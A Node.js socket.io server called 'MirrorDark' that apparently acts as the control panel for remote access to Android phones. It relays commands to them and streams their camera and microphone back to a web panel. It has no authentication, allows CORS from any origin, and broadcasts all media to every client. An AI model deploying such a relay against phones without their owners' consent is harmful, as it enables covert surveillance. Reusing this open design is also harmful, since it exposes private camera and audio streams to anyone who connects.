const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(express.static('public'));

let connectedDevices = new Map();

io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    // Enviar lista actual al abrir el panel web
    socket.emit('update_devices', Array.from(connectedDevices.values()));

    // 1. Registro del dispositivo Android
    socket.on('register_phone', (data) => {
        connectedDevices.set(socket.id, {
            id: socket.id,
            name: data.name || `Android Device (${socket.id.substring(0, 4)})`,
            ip: socket.handshake.address
        });
        console.log(`[📱] Celular registrado: ${socket.id}`);
        io.emit('update_devices', Array.from(connectedDevices.values()));
    });

    // 2. Envío de comandos desde la PC al celular (Cámaras, Micrófono, etc.)
    socket.on('send_command_to_device', (data) => {
        console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
        io.to(data.targetId).emit('command_to_phone', {
            action: data.action,
            ...data // Esto pasa extras como 'lens' de forma dinámica
        });
    });

    // 3. Respuestas generales del celular hacia el panel
    socket.on('phone_response', (response) => {
        console.log(`[<] Respuesta recibida del celular: ${socket.id}`);
        io.emit('phone_response', { ...response, deviceId: socket.id });
    });

    // 4. Frames de cámara que envía el celular hacia la PC
    socket.on('camera_frame', (base64Frame) => {
        io.emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
    });

    // 5. Chunks de audio que envía el celular (escuchar micrófono del nodo)
    socket.on('audio_chunk', (base64Audio) => {
        io.emit('audio_chunk', { deviceId: socket.id, chunk: base64Audio });
    });

    // 6. Chunks de audio que manda la PC para que el celular los reproduzca (Hablar al celular)
    socket.on('client_audio_chunk', (data) => {
        const { targetId, chunk } = data;
        io.to(targetId).emit('play_audio_chunk', { chunk });
    });

    // 7. Manejo de desconexiones
    socket.on('disconnect', () => {
        if (connectedDevices.has(socket.id)) {
            connectedDevices.delete(socket.id);
            console.log(`[-] Celular desconectado: ${socket.id}`);
            io.emit('update_devices', Array.from(connectedDevices.values()));
        } else {
            console.log(`[-] Panel web desconectado: ${socket.id}`);
        }
    });
});

const PORT = process.env.PORT || 4000; // Usamos 4000 para evitar choques con el puerto 3000 de React
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
});